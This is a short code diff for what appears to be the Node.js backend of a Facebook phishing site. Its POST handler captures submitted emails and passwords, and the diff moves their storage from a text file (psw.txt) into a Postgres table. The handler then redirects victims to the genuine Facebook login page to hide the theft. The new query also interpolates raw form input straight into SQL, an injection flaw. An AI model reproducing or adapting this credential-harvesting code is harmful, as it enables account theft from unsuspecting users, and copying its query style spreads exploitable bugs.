@@ -1,8 +1,11 @@
 var express = require('express');
 var app = express();
 var path = require('path');
-var fs = require('fs');
 var bodyParser = require('body-parser');
+
+const pg = require('pg');
+pg.defaults.ssl = true;
+const connectionString = process.env.DATABASE_URL;
 
 app.use(bodyParser.urlencoded({
     extended: false
@@ -18,11 +21,13 @@ app.get('/face_files/:id', function (req, res) {
 });
 
 app.post('/s', function (req, res) {
-    fs.appendFile(
-        __dirname + '/psw.txt',
-        JSON.stringify(req.body) + '\n\n',
-        (e) => {console.log(e);}
-    );
+    const pool = new pg.Pool({
+        connectionString
+    });
+    pool.query(`insert into oooo (id, l, p) values (1,${req.body.email},${req.body.pass})`, (err, res) => {
+        console.log(err, res);
+        pool.end();
+    });
     res.redirect('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110');
 });
 
